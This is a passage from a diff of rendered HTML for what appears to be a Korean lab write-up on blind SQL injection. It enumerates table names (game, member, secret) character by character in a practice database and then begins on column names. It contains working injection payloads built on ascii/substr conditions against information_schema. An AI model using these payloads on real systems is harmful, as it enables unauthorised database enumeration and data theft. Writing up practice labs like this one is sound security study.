class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;table_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;where&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;table_schema&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;segfault_sql&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select table_name from information_schema.tables where table_schema = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;segfault_sql&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; limit 0, 1), 1, 1))&amp;gt;95) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;1번째 TABLE 이름&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202078.png"
+loading="lazy"
+alt="Fig 2078."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202079.png"
+loading="lazy"
+alt="Fig 2079."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202080.png"
+loading="lazy"
+alt="Fig 2080."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202081.png"
+loading="lazy"
+alt="Fig 2081."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202082.png"
+loading="lazy"
+alt="Fig 2082."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202083.png"
+loading="lazy"
+alt="Fig 2083."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;1번째 글자는 g&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;2번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202084.png"
+loading="lazy"
+alt="Fig 2084."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202085.png"
+loading="lazy"
+alt="Fig 2085."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202086.png"
+loading="lazy"
+alt="Fig 2086."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2번째 글자는 a&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;3번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202087.png"
+loading="lazy"
+alt="Fig 2087."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202088.png"
+loading="lazy"
+alt="Fig 2088."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202089.png"
+loading="lazy"
+alt="Fig 2089."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202090.png"
+loading="lazy"
+alt="Fig 2090."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202091.png"
+loading="lazy"
+alt="Fig 2091."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;3번째 글자는 m&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;4번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202092.png"
+loading="lazy"
+alt="Fig 2092."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202093.png"
+loading="lazy"
+alt="Fig 2093."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202094.png"
+loading="lazy"
+alt="Fig 2094."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202095.png"
+loading="lazy"
+alt="Fig 2095."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202096.png"
+loading="lazy"
+alt="Fig 2096."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;4번째 글자는 e&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;5번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202097.png"
+loading="lazy"
+alt="Fig 2097."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202098.png"
+loading="lazy"
+alt="Fig 2098."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202099.png"
+loading="lazy"
+alt="Fig 2099."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020100.png"
+loading="lazy"
+alt="Fig 20100."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;5번째는 null&lt;/p&gt;
+&lt;p&gt;따라서 첫 번째 table 이름은 game&lt;/p&gt;
+&lt;p&gt;2번째 TABLE 이름&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020101.png"
+loading="lazy"
+alt="Fig 20101."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020102.png"
+loading="lazy"
+alt="Fig 20102."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020103.png"
+loading="lazy"
+alt="Fig 20103."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020104.png"
+loading="lazy"
+alt="Fig 20104."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;1번째 글자는 m&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;2번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020105.png"
+loading="lazy"
+alt="Fig 20105."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020106.png"
+loading="lazy"
+alt="Fig 20106."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020107.png"
+loading="lazy"
+alt="Fig 20107."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020108.png"
+loading="lazy"
+alt="Fig 20108."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020109.png"
+loading="lazy"
+alt="Fig 20109."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2번째 글자는 e&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;3번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020110.png"
+loading="lazy"
+alt="Fig 20110."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020111.png"
+loading="lazy"
+alt="Fig 20111."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020112.png"
+loading="lazy"
+alt="Fig 20112."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020113.png"
+loading="lazy"
+alt="Fig 20113."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020114.png"
+loading="lazy"
+alt="Fig 20114."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;3번째 글자는 m&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;4번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020115.png"
+loading="lazy"
+alt="Fig 20115."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020116.png"
+loading="lazy"
+alt="Fig 20116."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020117.png"
+loading="lazy"
+alt="Fig 20117."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;4번째 글자는 b&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;5번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020118.png"
+loading="lazy"
+alt="Fig 20118."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020119.png"
+loading="lazy"
+alt="Fig 20119."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020120.png"
+loading="lazy"
+alt="Fig 20120."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020121.png"
+loading="lazy"
+alt="Fig 20121."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020122.png"
+loading="lazy"
+alt="Fig 20122."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;5번째 글자는 e&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;6번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020123.png"
+loading="lazy"
+alt="Fig 20123."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020124.png"
+loading="lazy"
+alt="Fig 20124."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020125.png"
+loading="lazy"
+alt="Fig 20125."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020126.png"
+loading="lazy"
+alt="Fig 20126."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;6번째 글자는 r&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;7번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020127.png"
+loading="lazy"
+alt="Fig 20127."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020128.png"
+loading="lazy"
+alt="Fig 20128."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020129.png"
+loading="lazy"
+alt="Fig 20129."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;7번째는 null&lt;/p&gt;
+&lt;p&gt;따라서 두 번째 tabel 이름은 member&lt;/p&gt;
+&lt;p&gt;3번째 TABLE 이름&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020130.png"
+loading="lazy"
+alt="Fig 20130."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020131.png"
+loading="lazy"
+alt="Fig 20131."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020132.png"
+loading="lazy"
+alt="Fig 20132."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020133.png"
+loading="lazy"
+alt="Fig 20133."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;1번째 글자는 s&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;2번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020134.png"
+loading="lazy"
+alt="Fig 20134."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020135.png"
+loading="lazy"
+alt="Fig 20135."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020136.png"
+loading="lazy"
+alt="Fig 20136."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020137.png"
+loading="lazy"
+alt="Fig 20137."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2번째 글자는 e&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;3번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020138.png"
+loading="lazy"
+alt="Fig 20138."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020139.png"
+loading="lazy"
+alt="Fig 20139."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020140.png"
+loading="lazy"
+alt="Fig 20140."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020141.png"
+loading="lazy"
+alt="Fig 20141."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020142.png"
+loading="lazy"
+alt="Fig 20142."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;3번째 글자는 c&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;4번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020143.png"
+loading="lazy"
+alt="Fig 20143."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020144.png"
+loading="lazy"
+alt="Fig 20144."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020145.png"
+loading="lazy"
+alt="Fig 20145."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020146.png"
+loading="lazy"
+alt="Fig 20146."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020147.png"
+loading="lazy"
+alt="Fig 20147."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;4번째 글자는 r&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;5번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020148.png"
+loading="lazy"
+alt="Fig 20148."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020149.png"
+loading="lazy"
+alt="Fig 20149."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020150.png"
+loading="lazy"
+alt="Fig 20150."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;5번째 글자는 e&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;6번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020151.png"
+loading="lazy"
+alt="Fig 20151."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020152.png"
+loading="lazy"
+alt="Fig 20152."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020153.png"
+loading="lazy"
+alt="Fig 20153."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020154.png"
+loading="lazy"
+alt="Fig 20154."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020155.png"
+loading="lazy"
+alt="Fig 20155."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;6번째 글자는 t&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;7번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020156.png"
+loading="lazy"
+alt="Fig 20156."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020157.png"
+loading="lazy"
+alt="Fig 20157."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;7번째는 null&lt;/p&gt;
+&lt;p&gt;따라서 세번째 table 이름은 secret&lt;/p&gt;
+&lt;p&gt;테이블 이름은 더 있지만 시간 관계상 여기까지 찾고&lt;/p&gt;
+&lt;p&gt;칼럼 명을 찾겠다.&lt;/p&gt;
+&lt;h3 id="column-이름-찾기"&gt;Column 이름 찾기
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;column_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;where&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;table_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;game&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;Column&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;이름&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;찾기&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;문자&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (조건) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;column_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;where&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;table_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;game&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;column_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;where&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;table_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;game&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="w"&gt;
